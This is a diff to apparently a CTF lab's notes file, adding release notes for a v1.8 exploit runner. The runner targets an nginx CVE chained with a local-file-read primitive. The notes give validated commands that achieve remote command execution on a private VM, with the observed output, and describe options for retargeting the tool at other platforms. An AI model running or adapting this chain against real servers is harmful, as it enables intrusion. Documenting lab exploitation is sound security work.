@@ -251,18 +251,73 @@ marker LFI read: 404
 
 Status: pass.
 
+## v1.8 Changes
+
+`demo_ctf_exploit_v1_8.py` is the current operator-facing runner.
+
+- Default output is compact: banner, target preflight, ASLR/version summary, selected geometry, candidate counts, final proof, artifact path, and final command output.
+- `-v` / `--verbose` restores the detailed probe, candidate, and key/value trace useful for debugging.
+- `--cmd` is the normal command-execution path; the captured command output is printed last, with bounded wrapping/truncation.
+- `--help` is focused on target, operation, output, and the custom file-read hook. `--advanced-help` contains calibration, negative-test, and low-level tuning controls.
+- The start banner and help now name `CVE-2026-42945`, the rewrite/set args-escaping mismatch, the vulnerable `/api/...` route, same-port HTTP/2 victim, and fixed upstream releases.
+- The local-file-read primitive is modular. The default remains `/lfi.php?file=<path>&offset=<n>&length=<n>`, but `--file-read-template` can target another CTF app's file-download/LFI shape.
+- `--target-profile generic` skips this fork's lab-specific nginx config assertions for custom platforms while preserving the runtime checks required by the exploit chain.
+
+Validated compact command:
+
+```bash
+./demo_ctf_exploit_v1_8.py \
+  --host 192.168.1.205 --cmd 'id; uname -a; seq 1 20' \
+  --fast --artifact-dir artifacts
+```
+
+Observed result:
+
+```text
+target profile: lab
+nginx worker PID: 3058
+HTTP Server: nginx/1.31.0
+PHP version: 8.1.2-1ubuntu2.23
+libc dpkg version: 2.35-0ubuntu3.13
+winning address: 0x55e4210b2127
+winning body offset: 1376
+run artifact: artifacts/demo_v1_8_20260515-055614.json
+command output was printed as the final block
+```
+
+Validated template-backed file-read command:
+
+```bash
+./demo_ctf_exploit_v1_8.py \
+  --host 192.168.1.205 --cmd id --fast --rounds 1 \
+  --artifact-dir artifacts \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'
+```
+
+Observed result:
+
+```text
+File read: http://{host}:{port}/lfi.php?file={path_url}{range_query}
+winning address: 0x55e4210b2127
+winning body offset: 1376
+command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+run artifact: artifacts/demo_v1_8_20260515-055639.json
+```
+
+Status: pass. Both the default query-param adapter and the template adapter were live-tested against the VM target.
+
 ## Recommended Demo Command
 
 For video recording:
 
 ```bash
-./demo_ctf_exploit_v1_6.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2 --exec-cmd id
+./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --port 19321 --cmd id --clear
 ```
 
 For a fast validation run:
 
 ```bash
-./demo_ctf_exploit_v1_6.py --host 192.168.1.205 --port 19321 --fast --require-reset-core --rounds 2 --exec-cmd id
+./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --port 19321 --cmd id --fast
 ```
 
 ## Remaining Technical Limits
